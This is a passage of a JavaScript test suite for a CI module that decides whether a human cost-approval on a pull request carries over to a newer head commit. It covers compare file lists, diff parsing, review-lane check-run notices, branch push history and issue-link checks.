    "an edited patch": { ...TF, patch: "@@ -1 +1 @@\n-a\n+c" },
    "a rename": { ...TF, status: "renamed", previous_filename: "infra/old.tf" },
    "a status": { ...TF, status: "added" },
  })) {
    assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(changed) })).link, null, name);
  }
});

test("a compare of 300 files or more, a file with no patch, a filename listed twice, an unusable base name or a failed read carries nothing", async () => {
  const many = (n) => net(...Array.from({ length: n }, (_, i) => ({ filename: `f${i}`, status: "added", patch: "+x" })));
  assert.equal((await later({ [OLD]: many(299), [HEAD]: many(299) })).link, LINK);
  assert.equal((await later({ [OLD]: many(300), [HEAD]: many(300) })).link, null);
  const binary = { filename: "a.png", status: "modified" };
  assert.equal((await later({ [OLD]: net(binary), [HEAD]: net(binary) })).link, null);
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { fail: `compare ${HEAD}` })).link, null);
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: { status: "diverged" } })).link, null);
  for (const read of ["runs pr-review-hosted.yml", "runs pr-review-security-hosted.yml", "jobs 1", "notes 1", `compare ${OLD}`]) {
    assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { fail: read })).link, null, read);
  }
  assert.equal((await later({ [OLD]: net(TF, TF), [HEAD]: net(TF, TF) })).link, null);
  const moved = { filename: "b.tf", status: "renamed", previous_filename: "a.tf" };
  assert.equal((await later({ [OLD]: net(moved), [HEAD]: net(moved) })).link, null);
  for (const base of ["-main", "a..b", "a b", "", "x".repeat(256), null]) {
    const odd = await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { base });
    assert.equal(odd.link, null, String(base));
    assert.ok(!odd.reads.some((read) => read.startsWith("compare")), String(base));
  }
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { base: "release/2.x" })).link, LINK);
});

test("at the decided head the decision carries with no net-change compare", async () => {
  const { link, reads } = await decide();
  assert.equal(link, LINK);
  assert.deepEqual(
    reads.filter((read) => read.startsWith("compare")),
    [`compare ${HEAD}`],
  );
  assert.equal((await decide(undefined, { base: "" })).link, null);
});

test("with no cost hold notice before the decision nothing carries, even at the same head", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: `**Decision recorded.** Cost: approve it.${PROOF}`});
  for (const options of [{ row, closing: [] }, {}]) {
    const { link, reads } = await decide(options.row ? own : undefined, { ...options, runs: [] });
    assert.equal(link, null);
    assert.deepEqual(reads.slice(-2), ["runs pr-review-hosted.yml", "runs pr-review-security-hosted.yml"]);
  }
});

test("the decided head is read from the lanes' check-run notices, never from a comment", async () => {
  const { reads } = await decide();
  assert.ok(!reads.some((read) => /\/issues\/99\/comments/.test(read)), reads.join(", "));
  const { github, reads: all } = world();
  const seen = [];
  const actions = async (method, path, body) => {
    seen.push(path);
    return github(method, path, body);
  };
  const plain = async (method, path, body) => {
    assert.ok(!/\/actions\/|\/check-runs\//.test(path), path);
    return github(method, path, body);
  };
  assert.equal(await costDecision(plain, REPO, 99, `Closes #40\n\n${LINK}`, HUMANS, HEAD, actions), LINK);
  assert.ok(seen.some((path) => path.includes("/actions/workflows/")) && seen.some((path) => path.includes("/check-runs/")), seen.join(", "));
  assert.ok(all.includes("edited"));
});

test("the decision is the newest on the pull request, else the newest on its linked issue", async () => {
  const onPull = (id) => `https://github.com/owner/repo/pull/99#issuecomment-${id}`;
  const rows = {
    7: comment({ created_at: "2026-10-22T12:00:00Z" }),
    8: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-22T11:00:00Z", node_id: "IC_7" }),
    9: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-22T11:30:00Z", node_id: "IC_7" }),
  };
  const pick = async (body, runs) => {
    const { github: base } = world({ runs, compares: { [OLD]: net(TF), [HEAD]: net(TF, { filename: "b.tf", status: "added", patch: "+b" }) } });
    const github = async (method, path, data) => {
      const id = /\/issues\/comments\/([0-9]+)$/.exec(path)?.[1];
      return id ? rows[id] : base(method, path, data);
    };
    return costDecision(github, REPO, 99, body, HUMANS, HEAD);
  };
  const all = `Closes #40\n${LINK}\n${onPull(8)}\n${onPull(9)}`;
  assert.equal(await pick(all, [laneRun(HEAD, "2026-10-22T11:15:00Z")]), onPull(9));
  assert.equal(await pick(all, [laneRun(HEAD, "2026-10-22T10:00:00Z", { created: "2026-10-22T09:50:00Z" }), laneRun(OLD, "2026-10-22T11:15:00Z")]), null);
  assert.equal(await pick(`Closes #40\n${LINK}`, [laneRun(HEAD)]), LINK);
  rows[9] = { ...rows[9], body: "**Decision recorded.** Cost: approve it." };
  const missing = [];
  const { github: base } = world({ runs: [laneRun(HEAD, "2026-10-22T11:15:00Z")] });
  const github = async (method, path, data) => {
    const id = /\/issues\/comments\/([0-9]+)$/.exec(path)?.[1];
    return id ? rows[id] : base(method, path, data);
  };
  assert.equal(await costDecision(github, REPO, 99, `Closes #40\n${LINK}\n${onPull(9)}`, HUMANS, HEAD, github, missing), null);
  assert.equal(missing.length, 2);
  assert.equal(await pick(`Closes #40\n${LINK}`, [laneRun(HEAD)]), LINK);
});

test("the decided head is the newest cost notice a lane's status job recorded before the decision", async () => {
  const same = { [OLD]: net(TF), [HEAD]: net(TF, { filename: "b.tf", status: "added", patch: "+b" }) };
  const runs = (...extra) => decide(undefined, { runs: [laneRun(OLD), ...extra], compares: same });
  assert.equal((await decide(undefined, { runs: [laneRun(HEAD, "2026-10-22T10:40:00Z"), laneRun(OLD, "2026-10-22T11:30:00Z")], compares: same })).link, null);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z"))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { lane: "pr-review-security-hosted.yml" }))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { criteria: "cost,trust-gate" }))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "pr-review / review-status" }))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { lane: "pr-review-security-hosted.yml", job: "pr-review-security / review-status" }))).link, LINK);
  for (const [lane, job] of [
    ["pr-review-hosted.yml", "PR Review / Status"],
    ["pr-review-hosted.yml", "pr-review / Status"],
    ["pr-review-security-hosted.yml", "PR Review Security / Status"],
    ["pr-review-security-hosted.yml", "pr-review-security / Status"],
    ["pr-review-hosted.yml", "PR Review / Publish Review"],
    ["pr-review-hosted.yml", "pr-review / Publish Review"],
    ["pr-review-security-hosted.yml", "PR Review Security / Publish Review"],
    ["pr-review-security-hosted.yml", "pr-review-security / Publish Review"],
  ]) {
    assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { lane, job }))).link, LINK, job);
  }
  for (const [name, extra] of Object.entries({
    "the other lane's planned status job name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "PR Review Security / Publish Review" }),
    "the planned status job's bare name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "Publish Review" }),
    "the planned status job under another caller job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "other / Publish Review" }),
    "the other lane's Title Case status job name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "PR Review Security / Status" }),
    "the Title Case status job's bare name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "Status" }),
    "the Title Case status job under another caller job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "other / Status" }),
    "pr-review.yml's Title Case job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "pr-review / Claude" }),
    "a job done after the decision": laneRun(HEAD, "2026-10-22T12:30:00Z"),
    "a run started after the decision": laneRun(HEAD, "2026-10-22T11:30:00Z", { created: "2026-10-22T12:10:00Z" }),
    "a job other than the status job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "PR Review / review-key" }),
    "the other lane's status job name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: CHECKS["pr-review-security-hosted.yml"] }),
    "the status job's retired name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "pr-review / claude-review-status" }),
    "the security status job's retired name": laneRun(HEAD, "2026-10-22T11:30:00Z", { lane: "pr-review-security-hosted.yml", job: "pr-review-security / security-review" }),
    "the status job's name under another caller job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "other / review-status" }),
    "the status job's bare name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "review-status" }),
    "a notice naming another head than its run's": laneRun(OLD, "2026-10-22T11:30:00Z", { notice: HEAD }),
    "a notice without cost": laneRun(HEAD, "2026-10-22T11:30:00Z", { criteria: "trust-gate" }),
    "a run whose head is in another repository": laneRun(HEAD, "2026-10-22T11:30:00Z", { repo: "fork/repo" }),
    "a run with no head repository": laneRun(HEAD, "2026-10-22T11:30:00Z", { repo: null }),
  })) {
    assert.equal((await runs(extra)).link, null, name);
  }
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:00:00Z", { lane: "pr-review-security-hosted.yml" }))).link, null);
  const late = await decide(undefined, { runs: [laneRun(HEAD), laneRun(OLD, "2026-10-22T12:30:00Z", { created: "2026-10-22T12:10:00Z" })] });
  assert.ok(!late.reads.includes("jobs 2"), late.reads.join(", "));
});

test("a lane run on a head that changes a review-lane workflow, or whose compare cannot vet it, decides nothing", async () => {
  for (const [name, answer] of Object.entries({
    "the code lane's workflow": net(TF, { filename: ".github/workflows/pr-review-hosted.yml" }),
    "the security lane's workflow": net({ filename: ".github/workflows/pr-review-security-hosted.yml" }),
    "300 files": net(...Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` }))),
    "no file list": { status: "diverged" },
  })) {
    assert.equal((await decide(undefined, { compares: { [HEAD]: answer } })).link, null, name);
    const mixed = await decide(undefined, { runs: [laneRun(OLD, "2026-10-22T10:40:00Z"), laneRun(HEAD)], compares: { [OLD]: answer } });
    assert.equal(mixed.link, null, name);
  }
});

// #10437: a deleted lane run of a head pushed after the decided head, before
// the decision, would make an older notice the decided head. The branch's
// push history, which deleting a run leaves, shows that head, and it must
// have a run of every review lane started before the decision.
test("a head pushed between the decided head and the decision with no run of every lane keeps the hold", async () => {
  const NEW = "1111111111111111111111111111111111111111";
  const same = { [OLD]: net(TF), [HEAD]: net(TF) };
  const history = (...moves) => newestFirst([push(OLD, "2026-10-22T10:25:00Z"), ...moves]);
  const plain = (sha, lane) => laneRun(sha, "2026-10-22T11:20:00Z", { criteria: "trust-gate", lane, created: "2026-10-22T11:12:00Z" });
  const carried = (runs, activity, options = {}) => decide(undefined, { runs: [laneRun(OLD), ...runs], compares: same, activity, ...options });
  const both = [plain(NEW, "pr-review-hosted.yml"), plain(NEW, "pr-review-security-hosted.yml")];
  assert.equal((await carried(both, history(push(NEW, "2026-10-22T11:10:00Z")))).link, LINK);
  assert.equal((await carried([], history(push(NEW, "2026-10-22T12:10:00Z")))).link, LINK);
  for (const [name, runs] of Object.entries({
    "both lanes' runs deleted": [],
    "the code lane's run deleted": [plain(NEW, "pr-review-security-hosted.yml")],
    "the security lane's run deleted": [plain(NEW, "pr-review-hosted.yml")],
    "a run started only after the decision": both.map((run) => ({ ...run, created: "2026-10-22T12:05:00Z" })),
    "a run whose head is in another repository": both.map((run) => ({ ...run, repo: "fork/repo" })),
  })) {
    const kept = await carried(runs, history(push(NEW, "2026-10-22T11:10:00Z")));
    assert.equal(kept.link, null, name);
    assert.ok(kept.reads.includes("activity"), name);
  }
  const back = history(push(NEW, "2026-10-22T11:10:00Z"), push(OLD, "2026-10-22T12:30:00Z"));
  assert.equal((await carried([], back, { head: OLD })).link, null);
  assert.equal((await carried(both, [push(NEW, "2026-10-22T11:10:00Z")])).link, null);
  assert.equal((await carried(both, [push(OLD, "2026-10-22T12:30:00Z")])).link, null);
  assert.equal((await carried(both, history(), { fail: "activity" })).link, null);
  assert.equal((await carried(both, { message: "Not Found" })).link, null);
});

// A branch name recreated for each sync (chore/standards-sync, #10990) keeps
// its whole history in the activity API, so the decided head's push can sit
// past the first page of 100.
test("the head branch's push history is read past its first page", async () => {
  const NEW = "1111111111111111111111111111111111111111";
  const same = { [OLD]: net(TF), [HEAD]: net(TF) };
  const carried = (activity, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares: same, activity, ...options });
  const after = Array.from({ length: 149 }, (_, i) => push(NEW, new Date(Date.parse("2026-10-22T12:10:00Z") + i * 1000).toISOString()));
  const long = newestFirst([...after, push(OLD, "2026-10-22T10:25:00Z")]);
  const kept = await carried(long);
  assert.equal(kept.link, LINK);
  assert.deepEqual(kept.reads.filter((read) => read.startsWith("activity")), ["activity", "activity 2"]);
  const gap = newestFirst([...after.slice(0, 118), push(NEW, "2026-10-22T11:10:00Z"), push(OLD, "2026-10-22T10:25:00Z")]);
  assert.equal(gap[118].timestamp, "2026-10-22T11:10:00Z");
  assert.equal((await carried(gap)).link, null);
  assert.equal((await carried(long, { fail: "activity 2" })).link, null);
});

test("branchActivity follows the Link cursor, and fails closed on a bad page or cursor", async () => {
  const LINKED = Symbol.for("github.link");
  const page = (rows, next) => Object.defineProperty(rows, LINKED, { value: next === undefined ? null : `<https://api.github.com/repositories/1/activity?after=${next}>; rel="next", <https://api.github.com/x?before=z>; rel="prev"` });
  const reader = (answers) => {
    const paths = [];
    const read = async (_method, path) => {
      paths.push(path);
      const answer = answers[paths.length - 1];
      if (answer instanceof Error) throw answer;
      return answer;
    };
    return { read, paths };
  };
  const full = (from = 0) => Array.from({ length: 100 }, (_, i) => ({ id: from + i }));
  const first = "/repos/o/r/activity?ref=refs%2Fheads%2Fchore%2Fstandards-sync&direction=desc&per_page=100";
  const two = reader([page(full(), "Y3Vy%2Bc29y"), page([{ id: 100 }])]);
  assert.deepEqual(await holdsModule.branchActivity(two.read, "o/r", "chore/standards-sync"), [...full(), { id: 100 }]);
  assert.deepEqual(two.paths, [first, `${first}&after=Y3Vy%2Bc29y`]);
  await assert.rejects(holdsModule.branchActivity(reader([page(full())]).read, "o/r", "b"), /full page with no next link/);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), page(full(100))]).read, "o/r", "b"), /full page with no next link/);
  assert.equal(await holdsModule.branchActivity(reader([page(full(), "a"), { message: "Not Found" }]).read, "o/r", "b"), null);
  assert.equal(await holdsModule.branchActivity(reader([page(full(), "a"), null]).read, "o/r", "b"), null);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), new Error("502")]).read, "o/r", "b"), /502/);
  await assert.rejects(holdsModule.branchActivity(reader([Object.defineProperty(full(), LINKED, { value: '<https://api.github.com/x>; rel="next"' })]).read, "o/r", "b"), /no new page/);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), page(full(), "a")]).read, "o/r", "b"), /no new page/);
  const twenty = reader(Array.from({ length: 20 }, (_, i) => (i < 19 ? page(full(i * 100), `c${i}`) : page([{ id: 1900 }]))));
  assert.equal((await holdsModule.branchActivity(twenty.read, "o/r", "b")).length, 1901);
  const more = reader(Array.from({ length: 21 }, (_, i) => page(full(i * 100), `c${i}`)));
  await assert.rejects(holdsModule.branchActivity(more.read, "o/r", "b"), /runs past 20 pages/);
  assert.equal(more.paths.length, 20);
});

test("unranHead names the first head pushed after the decided head with no run of every lane", () => {
  const NEW = "1111111111111111111111111111111111111111";
  const at = "2026-10-22T12:00:00Z";
  const moves = [push(NEW, "2026-10-22T11:10:00Z"), { ...push("0".repeat(40), "2026-10-22T11:05:00Z"), activity_type: "branch_deletion" }, push(OLD, "2026-10-22T10:25:00Z")];
  assert.equal(unranHead(moves, [[OLD, NEW], [NEW]], OLD, at), null);
  assert.match(unranHead(moves, [[OLD], [NEW]], OLD, at), new RegExp(NEW));
  assert.match(unranHead(moves, [[OLD, NEW]], OLD, at), /every review lane/);
  assert.match(unranHead(moves, null, OLD, at), /every review lane/);
  assert.match(unranHead(moves, [[NEW], [NEW]], HEAD, at), /no push of/);
  assert.match(unranHead(moves, [[NEW], [NEW]], OLD, "not a time"), /no push of/);
  assert.match(unranHead([{ after: NEW, timestamp: "soon" }, ...moves], [[NEW], [NEW]], OLD, at), /unreadable/);
  assert.match(unranHead("nope", [[], []], OLD, at), /unreadable/);
  assert.equal(unranHead([push(OLD, "2026-10-22T11:30:00Z"), ...moves], [[OLD], [OLD]], OLD, at), null);
});

const LISTING = JSON.parse(readFileSync(new URL("./fixtures/contents-listing.json", import.meta.url), "utf8"));
const relisted = (entries, changes = {}) => entries.flatMap((entry) => (!(entry.name in changes) ? [entry] : changes[entry.name] === null ? [] : [{ ...entry, sha: changes[entry.name] }]));
const MANY = Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` }));

test("laneChangeIn reads a compare past its 300-file list as the review-lane workflows' blobs at the merge base and head", async () => {
  const BASE = "3".repeat(40);
  const AT = "4".repeat(40);
  const many = { ...net(...MANY), merge_base_commit: { sha: BASE } };
  const reader = (byRef) => {
    const paths = [];
    const read = async (method, path) => {
      paths.push(path);
      const ref = /^\/repos\/o\/r\/contents\/\.github\/workflows\?ref=([0-9a-f]{40})$/.exec(path)?.[1];
      if (method !== "GET" || !(ref in byRef)) throw new Error(`GET ${path} failed with status 404`);
      return structuredClone(byRef[ref]);
    };
    return { read, paths };
  };
  const same = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) });
  assert.equal(await laneChangeIn(same.read, "o/r", many, AT), null, "another workflow's change is not a lane change");
  assert.equal(same.paths.length, 2, "one listing at each end");
  const edited = reader({ [BASE]: LISTING.workflows, [AT]: relisted(LISTING.workflows, { "pr-review-security-hosted.yml": "e".repeat(40) }) });
  assert.equal(await laneChangeIn(edited.read, "o/r", many, AT), "a review-lane workflow");
  const added = reader({ [BASE]: relisted(LISTING.workflows, { "pr-review-hosted.yml": null }), [AT]: LISTING.workflows });
  assert.equal(await laneChangeIn(added.read, "o/r", many, AT), "a review-lane workflow", "a lane workflow new since the merge base is a change");
  assert.equal(await laneChangeIn(same.read, "o/r", { ...many, merge_base_commit: undefined }, AT), "too many files", "no merge base keeps the cap's answer");
  await assert.rejects(laneChangeIn(reader({ [BASE]: LISTING.workflows }).read, "o/r", many, AT), /404/, "an unread listing decides nothing");
  assert.equal(await laneChangeIn(same.read, "o/r", net(TF), AT), null);
  assert.equal(same.paths.length, 2, "a listed compare reads no tree");
});

test("a cost decision carries to a lane run on a 300-file head whose review-lane workflows match at its merge base", async () => {
  const BASE = "3".repeat(40);
  const compares = { [HEAD]: { ...net(TF, ...MANY), merge_base_commit: { sha: BASE } } };
  const unchanged = { [BASE]: LISTING.workflows, [HEAD]: relisted(LISTING.workflows, { "pr-merge.yml": "d".repeat(40) }) };
  const carried = await decide(undefined, { compares, listings: unchanged });
  assert.equal(carried.link, LINK, "the vetted head carries the decision");
  assert.ok(carried.reads.includes(`listing ${BASE}`) && carried.reads.includes(`listing ${HEAD}`), carried.reads.join(", "));
  const edited = { ...unchanged, [HEAD]: relisted(LISTING.workflows, { "pr-review-hosted.yml": "e".repeat(40) }) };
  assert.equal((await decide(undefined, { compares, listings: edited })).link, null, "a changed lane workflow vets nothing");
});

test("laneChange, costNotices and decidedHead", () => {
  assert.equal(laneChange(net(TF)), null);
  assert.equal(laneChange(net({ filename: ".github/workflows/pr-review-hosted.yml" })), "a review-lane workflow");
  assert.equal(laneChange(net(...Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` })))), "too many files");
  assert.equal(laneChange(null), "no file list");
  const note = (message, level = "notice") => ({ annotation_level: level, message });
  const at = "2026-10-22T11:00:00Z";
  assert.deepEqual(costNotices([note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=critical-security,cost label=needs-human`)], HEAD, at), [{ sha: HEAD, at }]);
  for (const [name, row] of Object.entries({
    "another head": note(`claude-lane-hold lane=claude-review sha=${OLD} criteria=cost label=needs-human`),
    "a warning": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost label=needs-human`, "warning"),
    "no label": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost`),
    "not cost": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=critical-security label=needs-human`),
    "not first": note(`x claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost label=needs-human`),
  })) {
    assert.deepEqual(costNotices([row], HEAD, at), [], name);
  }
  assert.deepEqual(costNotices(null, HEAD, at), []);
  const n = (sha, when) => ({ sha, at: when });
  assert.equal(decidedHead([n(OLD, "2026-10-22T10:00:00Z"), n(HEAD, "2026-10-22T11:00:00Z")], "2026-10-22T12:00:00Z"), HEAD);
  assert.equal(decidedHead([n(OLD, "2026-10-22T10:00:00Z"), n(HEAD, "2026-10-22T12:00:00Z")], "2026-10-22T12:00:00Z"), OLD);
  assert.equal(decidedHead([n(OLD, at), n(HEAD, at)], "2026-10-22T12:00:00Z"), null);
  assert.equal(decidedHead([n(HEAD, at), n(HEAD, at)], "2026-10-22T12:00:00Z"), HEAD);
  assert.equal(decidedHead([], "2026-10-22T12:00:00Z"), null);
  assert.equal(decidedHead([n(HEAD, at)], null), null);
});

test("sameNetChange compares filename, status, previous_filename and patch", () => {
  assert.equal(sameNetChange(net(TF), net({ ...TF })), true);
  assert.equal(sameNetChange(net(), net()), true);
  assert.equal(sameNetChange(net(TF), net({ ...TF, previous_filename: "x.tf" })), false);
  assert.equal(sameNetChange(null, net(TF)), false);
});

const DELETED = ".changes/user-interface/chore-comment-sweep-v060-a9938050.md";
const ADDED = ".changes/ai-slop/chore-comment-sweep-rem-2-94b10088.md";
const cutShort = (text, sections) => text.split(/^(?=diff --git )/m).slice(0, -sections).join("");
const bumped = (text) => text.replace("+bump: patch\n", "+bump: minor\n");

test("diffFiles reads every section of a compare's diff text in the compare file-list shape", () => {
  const files = diffFiles(DIFF_TEXT);
  assert.equal(files.length, 301);
  const named = (name) => files.find((f) => f.filename === name);
  assert.deepEqual(named(ADDED), { filename: ADDED, status: "added", modes: ["new file mode 100644"], patch: "@@ -0,0 +1,7 @@\n+---\n+bump: patch\n+---" });
  assert.deepEqual(diffFiles("diff --git a/old.md b/new.md\nsimilarity index 100%\nrename from old.md\nrename to new.md\n"), [{ filename: "new.md", status: "renamed", previous_filename: "old.md", patch: "", modes: [] }]);
  assert.equal(named(DELETED).status, "removed");
  assert.ok(named(DELETED).patch.startsWith("@@ -1,5 +0,0 @@\n----\n-bump: none\n----"), "a removed `---` line stays in the hunk");
});

test("diffFiles refuses text it cannot name and keeps a binary file patchless", () => {
  assert.equal(diffFiles(`index 1..2\n${DIFF_TEXT}`), null, "text before the first section");
  assert.equal(diffFiles('diff --git "a/sp\\303\\251cial" "b/sp\\303\\251cial"\nindex 1..2 100644\n--- "a/sp\\303\\251cial"\n+++ "b/sp\\303\\251cial"\n@@ -1 +1 @@\n-a\n+b\n'), null, "a quoted path");
  assert.equal(diffFiles("diff --git a/x b/x\nsome header\n"), null, "an unknown header line");
  assert.deepEqual(diffFiles("diff --git a/logo.png b/logo.png\nindex 1..2 100644\nBinary files a/logo.png and b/logo.png differ\n"), [{ filename: "logo.png", status: "modified", modes: [] }]);
  assert.deepEqual(diffFiles("diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n"), [{ filename: "run.sh", status: "changed", modes: ["old mode 100644", "new mode 100755"], patch: "" }]);
});

test("a listing at the compare API's 300 files is the same net change only on its two diffs", () => {
  assert.equal(LISTED.files.length, 300);
  assert.equal(needsDiff(LISTED), true);
  assert.equal(needsDiff(net(TF)), false);
  assert.equal(sameNetChange(LISTED, LISTED), false, "the listing alone may hide a file");
  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, DIFF_TEXT]), true);
  assert.notEqual(bumped(DIFF_TEXT), DIFF_TEXT);
  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, bumped(DIFF_TEXT)]), false, "one changed line");
  assert.equal(sameNetChange(LISTED, LISTED, [DIFF_TEXT, `${DIFF_TEXT}diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode 100755\n`]), false, "a file more");
  const none = { files: [] };
  const modeOnly = (mode) => `diff --git a/run.sh b/run.sh\nold mode 100644\nnew mode ${mode}\n`;
  assert.equal(sameNetChange(none, none, [modeOnly("100755"), modeOnly("100755")]), true);
  assert.equal(sameNetChange(none, none, [modeOnly("100755"), modeOnly("120000")]), false, "a mode the listing never reports");
  const binary = "diff --git a/logo.png b/logo.png\nindex 1..2 100644\nBinary files a/logo.png and b/logo.png differ\n";
  assert.equal(sameNetChange(none, none, [binary, binary]), false, "a binary change shows no patch to compare");
  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [DIFF_TEXT, DIFF_TEXT], 301), true);
  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN]), false);
});

test("two diffs cut short of the pull request's changed files, or of the files their listings name, carry nothing", () => {
  const one = cutShort(DIFF_TEXT, 1);
  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [one, one], 301), false, "300 files against 301 changed");
  assert.equal(baseMergeCarry(atOld(LISTED.files), merged(LISTED.files), OLD, [MAIN], [DIFF_TEXT, DIFF_TEXT]), false, "no changed-file count");
  const two = cutShort(DIFF_TEXT, 2);
  assert.equal(sameNetChange(LISTED, LISTED, [two, two]), false, "a diff missing a file the listing names");
});

test("wholeCompare pages the commits past the unpaged 250 and reads the files from the diff past 300", async () => {
  const reads = [];
  const read = async (path) => {
    reads.push(path);
    return { "/c/a...b?per_page=100&page=1": LISTED, "/c/a...b?per_page=100&page=2": PAGE_TWO }[path];
  };
  const whole = await wholeCompare(read, async (path) => (reads.push(`diff ${path}`), DIFF_TEXT), "/c/a...b");
  assert.equal(whole.total_commits, 150);
  assert.equal(whole.commits.length, 150);
  assert.deepEqual(whole.commits, [...LISTED.commits, ...PAGE_TWO.commits]);
  assert.equal(whole.files.length, 301);
  assert.deepEqual(reads, ["/c/a...b?per_page=100&page=1", "/c/a...b?per_page=100&page=2", "diff /c/a...b"]);
  const pages = [];
  const short = await wholeCompare(async (path) => (pages.push(path), path.endsWith("page=1") ? LISTED : { commits: PAGE_TWO.commits.slice(1) }), async () => DIFF_TEXT, "/c/a...b");
  assert.equal(short.commits.length, 149, "a page short of the total stays short");
  assert.equal(pages.length, 2, "the read stops at a page short of 100");
  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => "not a diff", "/c/a...b"), /does not parse/);
  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => cutShort(DIFF_TEXT, 2), "/c/a...b"), /names fewer files than its listing/);
  assert.deepEqual(diffFiles(""), []);
  await assert.rejects(wholeCompare(async (path) => (path.endsWith("page=1") ? LISTED : PAGE_TWO), async () => "", "/c/a...b"), /names fewer files than its listing/, "an empty diff body");
  const small = { ...PAGE_TWO, total_commits: 50, files: [TF] };
  assert.deepEqual(await wholeCompare(async () => small, async () => assert.fail("a listing under 300 needs no diff"), "/c/a...b"), small);
});

test("linkHold binds a pass to the issue and link kind it judged", () => {
  const closes = (...numbers) => ({ totalCount: numbers.length, nodes: numbers.map((number) => ({ number, repository: { nameWithOwner: "o/r" } })) });
  const record = (number, spec_kind) => ({ linked_issues: [{ number }], ...(spec_kind ? { spec_kind } : {}) });
  assert.equal(linkHold(record(5, "closes"), "Closes #5", closes(5), "o/r"), null);
  assert.equal(linkHold(record(5), "Closes #5", closes(5), "O/R"), null);
  assert.equal(linkHold(record(5, "refs"), "Refs: #5\n\n## Summary", closes(), "o/r"), null);
  assert.match(linkHold(record(5, "refs"), "Closes #6", closes(6), "o/r"), /link changed since pr-verify passed it: it closes #6, and the pass judged #5 \(refs\)/);
  assert.match(linkHold(record(5, "refs"), "Closes #5", closes(5), "o/r"), /link changed/);
  assert.match(linkHold(record(5, "closes"), "Refs: #5", closes(), "o/r"), /link changed/);
  assert.match(linkHold(record(5, "refs"), "Refs: #6", closes(), "o/r"), /refs #6, and the pass judged #5/);
  assert.equal(linkHold(record(5, "refs"), "Refs: #5\nRefs: #6", closes(), "o/r"), null);
  assert.equal(linkHold(record(5, "closes"), "Closes #5", closes(5, 6), "o/r"), null);
  assert.match(linkHold(record(5, "closes"), "Closes #6", closes(6, 7), "o/r"), /it closes #6, #7, and the pass judged #5/);
  assert.match(linkHold(record(5, "closes"), "", closes(), "o/r"), /it refs no issue, and the pass judged #5 \(closes\)/);
  assert.match(linkHold(record(5, "refs"), "## Summary", closes(), "o/r"), /it refs no issue, and the pass judged #5 \(refs\)/);
  assert.match(linkHold(record(5, "refs"), "<!-- Refs: #5 -->", closes(), "o/r"), /it refs no issue/);
  assert.match(linkHold(record(5, "refs"), "Refs: #6\nRefs: #7", closes(), "o/r"), /it refs #6, #7, and the pass judged #5/);
  assert.match(linkHold(record(5, "refs"), "Refs: x/y#5", closes(), "o/r"), /it refs no issue/);
  assert.match(linkHold(record(5, "refs"), "Closes #5, #6", closes(5, 6), "o/r"), /it closes #5, #6, and the pass judged #5 \(refs\)/);
  const foreign = { number: 5, repository: { nameWithOwner: "x/y" } };
  assert.match(linkHold(record(5, "closes"), "Closes x/y#5", { totalCount: 1, nodes: [foreign] }, "o/r"), /it closes x\/y#5, and the pass judged #5/);
  assert.equal(linkHold(record(5, "closes"), "Closes x/y#5\nCloses #5", { totalCount: 2, nodes: [foreign, ...closes(5).nodes] }, "o/r"), null);
  assert.match(linkHold(record(5, "pull-request"), "", closes(), "o/r"), /kind 'pull-request'/);
  assert.match(linkHold(null, "Closes #5", closes(5), "o/r"), /record could not be read/);
